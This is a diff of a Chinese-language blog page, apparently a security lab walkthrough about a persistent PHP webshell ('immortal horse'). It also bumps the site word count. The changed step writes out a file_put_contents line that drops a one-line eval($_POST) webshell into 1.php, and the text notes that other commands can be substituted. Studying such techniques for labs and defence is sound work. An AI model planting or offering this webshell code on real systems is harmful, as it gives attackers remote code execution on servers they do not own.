@@ -765,7 +765,9 @@
 <p>2.打开插件的不死马</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013214808955.png" alt="image-20211013214808955"></p>
 <p>3.前提在当前文件下创建一个xx.txt文件</p>
-<p>文件内容：file_put_contents(‘./1.php’,’<!--?php @eval($_POST[ash]); ?-->‘);    当然可以换别的命令。</p>
+<p>文件内容：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'./1.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>当然可以换别的命令。</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013221154686.png" alt="image-20211013221154686"></p>
 <p>4.输入</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211013223040392.png" alt="image-20211013223040392"></p>
@@ -1425,7 +1427,7 @@ SSPI
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">17.2k</span>
+            <span class="white-color">17.3k</span>
             
 
             <br>
